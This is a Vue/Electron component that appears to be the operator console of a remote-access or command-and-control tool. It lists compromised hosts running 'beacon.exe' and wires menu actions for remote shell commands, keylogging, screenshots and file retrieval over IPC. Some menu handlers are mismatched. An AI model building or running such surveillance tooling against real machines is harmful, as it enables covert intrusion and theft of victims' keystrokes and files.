<template>
  <div>
    <el-table
        :data="tableData"
        border
        stripe
        height="250"
        style="width: 100%"
        :row-class-name="tableRowClassName"
        @row-contextmenu="rightClick">
      <el-scrollbar style="height:100%">
        <el-table-column
            key="1"
            prop="externel"
            label="externel"
            width="200">
        </el-table-column>
        <el-table-column
            key="2"
            prop="internel"
            label="internel"
            width="200">
        </el-table-column>
        <el-table-column
            key="3"
            prop="listener"
            label="listener"
            width="150">
        </el-table-column>
        <el-table-column
            key="4"
            prop="user"
            label="user"
            width="150">
        </el-table-column>
        <el-table-column
            key="5"
            prop="process"
            label="process"
            width="100">
        </el-table-column>
      </el-scrollbar>
    </el-table>
    <div id="targetMenu">
      <div class="menu" 
        v-for="(item,index) in menus" 
        :key="index" 
        @click.stop="infoClick(index)">{{ item }}</div>
    </div>
  </div>
</template>

<script>
import { ipcRenderer } from 'electron'

let tableDATA = [{
  externel: '123.122.14.156',
  internel: '192.168.110.130',
  listener: 'test',
  user: 'admin',
  process: 'beacon.exe'
}, {
  externel: '123.122.14.156',
  internel: '192.168.110.130',
  listener: 'test',
  user: 'admin',
  process: 'beacon.exe'
}, {
  externel: '123.122.14.156',
  internel: '192.168.110.130',
  listener: 'test',
  user: 'admin',
  process: 'beacon.exe'
}, {
  externel: '123.122.14.156',
  internel: '192.168.110.130',
  listener: 'test',
  user: 'admin',
  process: 'beacon.exe'
}, {
  externel: '123.122.14.156',
  internel: '192.168.110.130',
  listener: 'test',
  user: 'admin',
  process: 'beacon.exe'
}]

export default {
  data () {
    return {
      menus: ['刷新列表', '屏幕截图', '键盘记录', '文件目录', '断开连接'],
      tableData: tableDATA,
      currentRowIndex: 0
    }
  },
  methods: {
    tableRowClassName ({row, rowIndex}) {
      row.index = rowIndex
    },
    // 自定义菜单点击事件
    infoClick (index) {
      this.$alert('当前table的下标为' + this.currentRowIndex, '你点击了自定义菜单的' + this.menus[index] + '功能', {
        confirmButtonText: '确定',
        callback: action => {
          var targetMenu = document.querySelector('#targetMenu')
          targetMenu.style.display = 'none'
        }
      })
      if (this.menus[index] === '刷新列表') {
        this.$forceUpdate()
      }
      if (this.menus[index] === '屏幕截图') {
        this.updateTargetList()
        // todo Screenshot
      }
      if (this.menus[index] === '键盘记录') {
        this.getScreenShot()
      }
      if (this.menus[index] === '文件目录') {
        // todo FileBrowser
      }
      if (this.menus[index] === '断开连接') {
        // todo 断开连接
      }
    },
    /**
     * @description: 更新当前靶机
     * @param {string} newUuid 当前target索引
     * @return {type} 返回成功改变的uuid
     */
    changeCurrentTarget (newUuid) {
      ipcRenderer.once('currentTargetChanged', (event, packet) => {
        console.log(`new target uuid ${packet}`)
      })
      ipcRenderer.send('setCurrentTarget', newUuid)
    },
    /**
     * @description: 更新靶机列表
     * @return {json}  targetList 靶机列表
     */
    updateTargetList () {
      ipcRenderer.once('updateTargetList', (event, targetList) => {
        console.log(JSON.stringify(targetList))
        console.log(targetList[0].uuid)
        this.changeCurrentTarget(targetList[0].uuid)
      })
      ipcRenderer.send('requestTargetList')
    },
    /**
     * @description: 请求shell
     * @return {boolean} status shell连接状态
     */
    requestShell () {
      ipcRenderer.once('getShell', (event, status) => {
        alert('Vue:' + status)
      })
      ipcRenderer.send('requestShell', 'start')
    },
    /**
     * @description: 请求断开shell
     * @return {boolean} status shell连接状态
     */
    stopShell () {
      ipcRenderer.once('stopShell', (event, status) => {
        alert('Vue:' + status)
      })
      ipcRenderer.send('requestShell', 'stop')
    },
    /**
     * @description: 请求键盘更新
     * @return {string} stream 新增的键盘输入
     */
    requestKeylogger () {
      ipcRenderer.once('updateKeylogger', (event, stream) => {
        alert('Vue:' + stream)
      })
      ipcRenderer.send('requestKeylogger', 'start')
    },
    /**
     * @description: 断开键盘更新
     * @return {string} res 断开键盘监控提示
     */
    stopKeylogger () {
      ipcRenderer.once('keyloggerStop', (event, res) => {
        alert('Vue:' + res)
      })
      ipcRenderer.send('requestKeylogger', 'stop')
    },
    /**
     * @description: 断开靶机连接
     * @return {string} status 靶机断开回复
     */
    disconnectTarget () {
      ipcRenderer.once('disconnected', (event, status) => {
        alert('Vue:' + status)
      })
      ipcRenderer.send('disconnect')
    },
    /**
     * @description: 获取屏幕截图
     * @return {string} url 屏幕截图保存路径
     */
    getScreenShot () {
      ipcRenderer.once('ScreenShot', (event, url) => {
        alert('截图保存在' + url)
      })
      ipcRenderer.send('requestScreenShot')
    },
    /**
     * @description: 获取文件
     * @return {string} url 文件保存路径
     */
    getFile (path) {
      ipcRenderer.once('transfile', (event, url) => {
        alert('文件保存在' + url)
      })
      ipcRenderer.send('requestFile', path)
    },
    /**
     * @description: 求取文件预览目录
     * @return {undefined} filePreview 文件预览目录
     */
    requestFilePreview () {
      ipcRenderer.once('filepreview', (event, filePreview) => {
        alert('Vue:' + filePreview)
      })
      ipcRenderer.send('requestFilePreview')
    },
    /**
     * @description: 发送shell指令
     * @param {string} commandLines 命令行
     * @return {string} shell指令回复
     */
    sendCommand (commandLines) {
      ipcRenderer.once('commandSended', (event, res) => {
        alert('Vue:' + res)
      })
      ipcRenderer.send('sendCommand', commandLines)
    },
    // table的右键点击当前行事件
    rightClick (row, column, event) {
      var targetMenu = document.querySelector('#targetMenu')
      event.preventDefault()
      targetMenu.style.left = (event.clientX - 200) + 'px'
      targetMenu.style.top = (event.clientY - 60) + 'px'
      targetMenu.style.display = 'block'
      console.log(row, column)
      this.currentRowIndex = row.index
    }
  }
}
</script>

<style>
.el-table__body-wrapper::-webkit-scrollbar {
  /*width: 0;宽度为0隐藏*/
  width: 0;
}

.el-table__body-wrapper::-webkit-scrollbar-thumb {
  border-radius: 2px;
  height: 50px;
  background: #eee;
}

.el-table__body-wrapper::-webkit-scrollbar-track {
  overflow-x: hidden;
  overflow-y: hidden;
  box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.2);
  border-radius: 2px;
  background: rgba(0, 0, 0, 0.4);
}

#targetMenu {
  font-size: 12px;
  width: 100px;
  height: 125px;
  overflow: hidden; /*隐藏溢出的元素*/
  box-shadow: 0 1px 1px #888, 1px 0 1px #ccc;
  position: absolute;
  display: none;
  background: #ffffff;
  z-index: 10;
}

.menu {
  width: 125px;
  height: 25px;
  line-height: 25px;
  text-indent: 10px;
  cursor: pointer;
}

.menu:hover {
  color: deeppink;
  text-decoration: underline;
}
</style>
